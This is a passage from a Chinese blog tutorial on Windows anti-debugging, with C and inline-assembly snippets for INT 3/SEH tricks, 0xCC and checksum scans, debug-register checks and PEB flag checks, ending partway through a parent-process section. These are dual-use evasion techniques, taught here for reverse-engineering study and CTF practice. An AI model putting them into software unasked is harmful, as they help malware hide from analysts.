<p>第一个问题很简单，实际上调试器给我们做了”伪装”，实际上指令已经变了，只不过展示给用户的还是C645 FC 00，而第二、三个问题就稍微复杂一些了，为了解决这个问题，我们就需要恶补一点关于软件断点的知识了。</p>
<p>当调试器遇见INT 3时，首先会执行类似初始化的操作，在《英特尔IA-32架构软件开发手册》中我们可以找到相应的代码，为了理解方便，这里我写了效果相同的伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (中断向量号 <span class="keyword">not</span> in 中断向量表)</span><br><span class="line">	General_Protection_Exception()</span><br><span class="line"><span class="keyword">if</span> (栈 <span class="keyword">not</span> have <span class="keyword">sizeof</span>(cs)+<span class="keyword">sizeof</span>(eip))</span><br><span class="line">	Stack_Exception()</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	IF=<span class="number">0</span></span><br><span class="line">	TF=<span class="number">0</span></span><br><span class="line">	AC=<span class="number">0</span></span><br><span class="line">	push cs</span><br><span class="line">	push eip</span><br><span class="line">	cs =对应异常处理例程的cs</span><br><span class="line">	eip=对应异常处理例程的eip</span><br></pre></td></tr></table></figure>
<p>上面的处理实际上在栈里维护了一个结构，它保存着相关寄存器的信息，也被叫做TRAP_FRAME陷阱帧，而之后就该进入中断处理例程了。我们可以用windbg来查看具体的函数，注意要在内核调试状态，命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!idt</span><br><span class="line">uf Trap3地址</span><br></pre></td></tr></table></figure>
<p>这里有很多操作就不再一一详细论述，但比起其他的中断处理例程，显然它多出了如下的部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     ebx, [ebp+68h]      </span><br><span class="line">dec     ebx                  </span><br><span class="line">mov     ecx, 3                </span><br><span class="line">mov     eax, 80000003h      </span><br><span class="line">call    CommonDispatchException</span><br></pre></td></tr></table></figure>
<p>这里的ebx实际上就是之前压栈的eip了，dec令其自减1，也就是说之前本来指向45 FC 00的eip又重新指向了INT 3了，之后当我们恢复执行时，调试器再将INT 3位置的hex填充回C6，程序也就恢复”正常”了，这就解决了我们之前的两个问题。</p>
<p>但是问题就又来了，你程序恢复正常，可用户那可没取消这个断点啊！有过调试经验的人都知道，我们下了断点后，执行过去断点还在那，不会取消，可按照上面的逻辑INT 3已经被”修复”了，之后应该没有了才对。  这个问题也很简单，调试器会维护一个记录断点信息的文件（如VC6的文件是.opt），当我们执行过一个断点后，调试器设置一个标志位的硬件断点，当执行完下断点的指令后再次中断，这次中断就会将记录的断点信息全部设置一遍，也就解决了这个问题。</p>
<p>有了上面的知识，我们就可以开始构思一个简单的反调试软件了，既然调试器是用int 3实现软件断点，那我们也完全可以用个假的int 3来骗调试，让它误以为此处应该进行中断处理（如果在非调试器下，则会因为INT 3指令进入异常处理），然后陷入我们提前布置好的陷阱，由于各个调试器的具体处理略有差异，所以具体调试情况可能略有出入，以下均使用VS调试器进行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">anti_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	BOOL flag = FALSE;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		push my_seh</span><br><span class="line">		push DWORD ptr fs : [<span class="number">0</span>]</span><br><span class="line">		mov DWORD ptr fs : [<span class="number">0</span>], esp</span><br><span class="line">		__emit(<span class="number">0xcc</span>)</span><br><span class="line">		mov flag, <span class="number">1</span></span><br><span class="line">		jmp remove_seh</span><br><span class="line">my_seh :</span><br><span class="line">		mov eax, dword ptr ss : [esp + <span class="number">0xc</span>];</span><br><span class="line">		mov dword ptr ds : [eax + <span class="number">0xb8</span>], remove_seh</span><br><span class="line">		xor eax, eax</span><br><span class="line">		retn</span><br><span class="line">remove_seh:</span><br><span class="line">		pop dword ptr fs : [<span class="number">0</span>]</span><br><span class="line">		add esp, <span class="number">4</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，__emit()函数相当于将里面的hex转换为指令，0xCC自然就是INT 3了，首先我们将自己的SEH处理函数my_seh装载了，然后设置了假的断点。如果是在调试器内，INT3就被很平常的执行了，然后直接下一句将flag置为1，最终用remove_seh卸载了我们的seh，如图所示，在vs调试器中我们成功将flag置为了1。</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1zzov6i99j30bg02mwem.jpg" alt="image-20190412174233212"></p>
<p>而在非调试器环境下由于INT 3会进入我们的my_seh中，先是拿到了EXCEPTION_REGISTRATION_RECORD的地址，将我们卸载自己seh的remove_seh装载进去，现在的SEH链表的第一个处理函数就是我们的remove_seh了，再次触发断点异常时我们自己的SEH函数就被卸载了，程序也就正常执行下去了。注意，这里的esp+0xc是实际计算出来的，如果你改了代码此处也需要修改，不改或者改错的话就会导致SEH始终是之前的SEH，也就是会无限循环处理该异常。</p>
<p>同样我们也可以将这个思路放到函数隐藏上，我们可以将自己的函数伪装成SEH的处理函数，然后我们在执行过程中故意设置一个异常，迫使程序进入SEH处理函数，如下图代码所示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">seh</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">bool</span> bDebugging = <span class="literal">false</span>;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">			push getFlag</span><br><span class="line">			push DWORD ptr fs : [<span class="number">0</span>]</span><br><span class="line">			mov DWORD ptr fs : [<span class="number">0</span>], esp</span><br><span class="line">			__emit(<span class="number">0xcc</span>)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> bDebugging;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	scanf_s(<span class="string">"%s"</span>, &amp;a, <span class="number">25</span>);</span><br><span class="line">	seh();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"bye~~~~~"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中getFlag也就是我们的关键函数，我们生成可执行文件并用ida打开</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g20uj5kv59j307903e0sx.jpg" alt="image-20190413112937771"></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g20ujp2sg1j306h020749.jpg" alt="image-20190413113009471"></p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g20ujvhn4jj304s024t8o.jpg" alt="image-20190413113019714"></p>
<p>可以看到我们的函数被隐藏了起来，不太容易被发现了，而如果用od调试的话，会因为od会“无视”INT 3，反而导致调试者进不去关键函数了，成功提高了程序被逆向的难度。不过这里还是要注意处理无限循环的问题，因为我们的函数如果没有修复断点异常的话就会导致程序再次执行断点进行无限循环，导致程序崩溃。</p>
<p>当然，我们还可以更变态一点，使用多层SEH，每一层的SEH都对应一部分的解密函数，这样调试者就很难理清里面的关系了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">seh3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"this is seh3"</span>);</span><br><span class="line">	Sleep(<span class="number">1000000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">seh2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"this is seh2"</span>);</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push seh3</span><br><span class="line">		push DWORD ptr fs : [<span class="number">0</span>]</span><br><span class="line">		mov DWORD ptr fs : [<span class="number">0</span>],esp</span><br><span class="line">		__emit(<span class="number">0xcc</span>)</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">seh1</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"this is seh1"</span>);</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push seh2</span><br><span class="line">		push DWORD ptr fs : [<span class="number">0</span>]</span><br><span class="line">		mov DWORD ptr fs : [<span class="number">0</span>], esp</span><br><span class="line">		__emit(<span class="number">0xcc</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"welcome to skctf"</span>);</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push seh1</span><br><span class="line">		push DWORD ptr fs : [<span class="number">0</span>]</span><br><span class="line">		mov DWORD ptr fs : [<span class="number">0</span>], esp</span><br><span class="line">		__emit(<span class="number">0xcc</span>)</span><br><span class="line">		pop dword ptr fs : [<span class="number">0</span>]</span><br><span class="line">		add esp, <span class="number">4</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"bye"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至于会输出什么大家可以猜猜，要注意这里的多重SEH的卸载是很难操作的，所以我最后是让程序sleep，防止无限循环。</p>
<p>###利用UnhandledExceptionFilter与软件断点机制实现反调试</p>
<p>UnhandledExceptionFilter我们在之前的文章中也详细说了，实际上它就是SEH的”不得已”处理例程，只有当seh链上的处理函数都无法处理异常时才会触发，我们可以把它看作是SEH的一种特殊情况，我们可以通过以下代码设定我们自定义的UnhandledExceptionFilter，至于详细的执行过程可以参考之前的文章</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnhandledExceptionFilter（function_name）</span><br></pre></td></tr></table></figure>
<p>思路和上面的一样，同样是利用调试器对于断点的处理机制进行构造，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG WINAPI <span class="title">Exception</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_ struct _EXCEPTION_POINTERS *ExceptionInfo</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span> </span>&#123;</span><br><span class="line">	ExceptionInfo-&gt;ContextRecord-&gt;Eip += <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CheckDebug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		__emit(<span class="number">0xCC</span>);</span><br><span class="line">		mov flag, <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g203jnb773j30a003ljrj.jpg" alt="image-20190412195555726"></p>
<p>当程序被调试时，如图所示，0xcc相当于被忽视，flag被设置为1。而在正常运行时，由于断点触发SEH处理，我们并没有可以解决该异常的处理函数，所以调用了Exception函数。</p>
<p>Exception函数设置了EXCEPTION_POINTERS结构，这个结构我们也详细说过了，这里主要是调整EIP的值实现跳过INT 3，要不然的话又会触发无限循环的断点异常。</p>
<h3 id="0xCC检测"><a href="#0xCC检测" class="headerlink" title="0xCC检测"></a>0xCC检测</h3><p>我们说了软件断点会让原本位置的指令替换成0xcc进而实现中断，那如果我们正在调试一个windows GUI程序的话，我们是不是会经常在比如MessageBox、GetDlgltemText等API处下断点？那我们只需要利用指针指向这些函数指令的起始地址，检测是否为0xcc即可实现反调试，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bool CheckDebug()) </span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">	PBYTE pCC = (PBYTE)MessageBoxW;</span><br><span class="line">	<span class="keyword">if</span> (*pCC == <span class="number">0xCC</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		flag = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那我们又可以从这个基础上出发，如果说我们划定一块代码区域，那这一片区域的0xcc的数量是不是应该是个固定的值？如果调试者下了断点，那就会导致这个数量变化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CheckDebug_Checksum</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">bool</span> flag = FALSE;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		call CHECKBEGIN</span><br><span class="line">begin:</span><br><span class="line">		pop esi</span><br><span class="line">		mov ecx, <span class="number">0x15</span>           </span><br><span class="line">		xor eax, eax           </span><br><span class="line">		xor ebx, ebx</span><br><span class="line">check:</span><br><span class="line">		movzx ebx, byte ptr ds : [esi]</span><br><span class="line">		add eax, ebx</span><br><span class="line">		rol eax, <span class="number">1</span></span><br><span class="line">		inc esi</span><br><span class="line">		loop check</span><br><span class="line">		cmp eax, <span class="number">0x1859a602</span></span><br><span class="line">		je _NOT_DEBUGGING</span><br><span class="line">		mov flag, <span class="number">1</span></span><br><span class="line">_NOT_DEBUGGING:</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>CHECKBEGIN的开始我们pop了esi，实际上就是拿到了当前的代码的地址，ecx作为循环的计数器，接着清空了eax和ebx为之后做准备</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g20u4wrb2qj307t020mx4.jpg" alt="image-20190413111556742"></p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g20u5283d9j303z00wglf.jpg" alt="image-20190413111605938"></p>
<p>check部分就是靠着esi拿到了每一条指令的十六进制码，最终经过处理后和我们设定的值比较，如果不是的话就说明程序的汇编代码被修改过了，存在调试器。</p>
<h3 id="GetLastError"><a href="#GetLastError" class="headerlink" title="GetLastError"></a>GetLastError</h3><p> 这个函数我们在之前的格蠹汇编练习题中提到过，我们也解释了相关的WER机制，简单的说，这个函数就是将最后一个错误汇报给我们，那我们可以先设置一个error，然后执行一个仅在调试器中有意义的函数，如果error变了，说明函数错了，我们没在调试器中，如果没变，说明函数正常执行了，那就是在调试器中了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CheckDebug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD error = <span class="number">11111</span>;</span><br><span class="line"> 	<span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">  SetLastError(error);</span><br><span class="line">	OutputDebugString(<span class="string">"  "</span>);</span><br><span class="line">	<span class="keyword">if</span> (GetLastError() == error)</span><br><span class="line">	&#123;</span><br><span class="line">		flag = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> flag</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>OutputDebugString函数是在调试器中输出一段话的意思，如果在非调试状态下自然就失效了，失效了就会导致last error发生变化，也就和我们最开始设定的error不同啦。</p>
<h3 id="INT-2D"><a href="#INT-2D" class="headerlink" title="INT 2D"></a>INT 2D</h3><p>我们说过一般调试器使用INT 3来实现断点机制，但INT 2D同样能够实现断点功能，只不过它一般用作内核调试时的断点指令，但是其实在用户态它一样可以发挥作用，不过要注意的是有些调试器对齐处理有所差别，不过无伤大雅，我们将之前的INT 3改为INT 2D，可以看到效果相同。</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g227xazbk9j30e0089q3x.jpg" alt="image-20190414155835054"></p>
<h2 id="硬件断点的反调试"><a href="#硬件断点的反调试" class="headerlink" title="硬件断点的反调试"></a>硬件断点的反调试</h2><p>上面我们详细说明了软件断点的机制并且了解了基于软件断点的反调试技术，下面让我们看看硬件断点的相关知识。</p>
<p>大家对ESP定律脱壳应该都不陌生，在PUSHAD后我们会下一个叫做”数据访问断点”的特殊断点，当程序访问这段数据时，就会断下来等待我们的调试。现在如果是我们来设计这个功能，我们能够用0xcc来实现吗？显然不能，0xcc作为指令有它的”先天缺陷” —— 它必须要执行（被当作代码）才能触发。那我们来构思一种断点机制，它可以保存地址，只要是对这个地址进行了操作，不管是读写还是执行，我们就断下来，这不就可以实现在数据处下断点的功能了吗？</p>
<p>这其实就是硬件断点的精髓，Windows采用了DR0～DR7的8个调试器来实现硬件断点，它们各自承担着不同的职能：</p>
<ul>
<li>DR0～DR3，调试地址寄存器，顾名思义是用来存放地址的，即然有4个说明我们的硬件断点理论上最多有四个</li>
<li>DR6（DR4等价于RR6），调试状态寄存器，它向调试器的断点异常处理程序提供断点的详细信息</li>
<li>DR7（DR5等价于DR7），调试控制寄存器，它对应许多标志位，实现了区分不同的硬件断点</li>
</ul>
<p>当我们下一个硬件断点时，断点又可以分为以下的三类：</p>
<ul>
<li>代码访问断点，也就是我们的调试地址寄存器指向的是代码段的一句指令，运行到此处时就会触发断点。听起来和软件断点似乎没有什么不同，但要注意，我们并没有用0xcc去覆盖指令，这就意味着我们不需要复杂的操作来善后，更关键的是，当我们下软件断点时，因为要覆盖，所以要覆盖的指令必须先存在，如果碰到SMC类的程序（如果不知道的朋友可以当作是代码边执行边生成，并不是一次性出现了全部代码）就会碰到下不上断点的尴尬处境，而硬件断点因为是地址，哪怕某个时刻该地址的指令还没被加载，也一样可以下断点。另外，大家最熟悉的单步调试实际上也是用了这个原理。</li>
<li>数据访问断点，我们的调试地址寄存器指向的是一段数据，一旦数据被修改被访问我们就可以立刻断下来，是用来监测全局变量、局部变量的好帮手</li>
<li>I/O访问断点，对于此类断点在用户态调试时用的并不多，但是对于经常和io打交道的驱动程序来说就很常用了。</li>
</ul>
<p>通过上面的说明，我们应该很容易想到预防硬件断点的反调试手段，即然你用的是寄存器表示，我只需要看看你寄存器的值是不是空就可以判断你是不是下过硬件断点了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CheckDebug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  	<span class="keyword">bool</span> flag;</span><br><span class="line">  </span><br><span class="line">		CONTEXT context;  </span><br><span class="line">    HANDLE hThread = GetCurrentThread();  </span><br><span class="line">    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;  </span><br><span class="line">    GetThreadContext(hThread, &amp;context); </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (context.Dr0 != <span class="number">0</span> || context.Dr1 != <span class="number">0</span> || context.Dr2 != <span class="number">0</span> || context.Dr3!=<span class="number">0</span>)   </span><br><span class="line">    &#123;  </span><br><span class="line">        flag = <span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> flag;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>##基于PEB等的反调试</p>
<h3 id="BeingDebugged"><a href="#BeingDebugged" class="headerlink" title="BeingDebugged"></a>BeingDebugged</h3><p>PEB即Thread Environment Block，线程环境块，我们之前说过了几个它的重要成员，我们提到过偏移为0×002的BeingDebugged是标示进程是否处于被调试状态的一个标志位，那我们自然可以用它来探测了</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g14rov93xfj30sy0iatd3.jpg" alt="image-20190316173312710"></p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CheckDebug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">bool</span> bDebugged = <span class="literal">false</span>;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		MOV EAX, DWORD PTR FS : [<span class="number">0x30</span>]</span><br><span class="line">			MOV AL, BYTE PTR DS : [EAX + <span class="number">2</span>]</span><br><span class="line">			MOV bDebugged, AL</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> bDebugged;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>FS:[30]也就是PEB的地址，+2也就是拿到了BeingDebugged的值</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g204fyz7fqj30al03pt93.jpg" alt="image-20190412202347254"></p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g204fyf6uej30al03pt93.jpg" alt="image-20190412202355815"></p>
<p>可以看到在调试状态下确实返回了1</p>
<p>实际上微软为我们封装了一个专门的API — IsDebuggerPresent()，我们在使用时可以直接用它，有兴趣的朋友可以看看它的反汇编代码，会发现和我们写的几乎一模一样。</p>
<h3 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h3><p>当我们处于调试状态时，实际上会创建一个调试堆（这部分内容大概可能也许会在不久之后的《Windows调试艺术》中详细解释），我们可以通过检查堆的情况来判断程序是否被调试，NtGlobalFlag就是这样一个标志位，它实际上表示了堆的状态，如果它的0x70，也就是说明有调试器了，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CheckDebug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nNtFlag = <span class="number">0</span>;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		MOV EAX, DWORD PTR FS : [<span class="number">0x30</span>]</span><br><span class="line">		MOV EAX, DWORD PTR DS : [EAX + <span class="number">0x68</span>]</span><br><span class="line">		MOV nNtFlag, EAX</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">if</span>(nNtFlag==<span class="number">0x70</span>)</span><br><span class="line">		nNtFlag=<span class="number">1</span></span><br><span class="line">   <span class="keyword">return</span> nNtFlag</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ProcessHeap"><a href="#ProcessHeap" class="headerlink" title="ProcessHeap"></a>ProcessHeap</h3><p>当然，即然堆发生了改变，那我们也可以直接用ProcessHeap的属性来查看是否处于调试状态。主要运用的是ForceFlags和Flags两个标志位，但由于在不同版本的windows上偏移不同，这里就不再给出具体代码了。</p>
<h3 id="ParentProcess"><a href="#ParentProcess" class="headerlink" title="ParentProcess"></a>ParentProcess</h3><p>我们随手编写一个测试程序test，分别在vs调试器、正常状态下打开，运用以下命令来查看父进程的ID</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where Name=&quot;test.exe&quot; get ParentProcessId</span><br></pre></td></tr></table></figure>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g20vtzokj9j30gr045weu.jpg" alt="image-20190413121438858"></p>
<p>可以看到父进程是明显不同的，这是因为对于调试器来说，程序被调试也就是说要在它的掌控之下，所以程序必然是它的子进程，而正常状态下，程序的父进程一般都是explorer.exe，我们只需要利用这一点监测当前程序的父进程也就可以实现反调试了</p>
<p>微软提供给了我们如下的函数，虽然还是未公开的，但已经被人研究透了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">NtQueryInformationProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  __in       HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in       PROCESSINFOCLASS ProcessInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">  __out      PVOID ProcessInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in       ULONG ProcessInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">  __out_opt  PULONG ReturnLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>它的第二个参数说对应的结构体如下，其中Reserved3也就是父进程的ID</p>
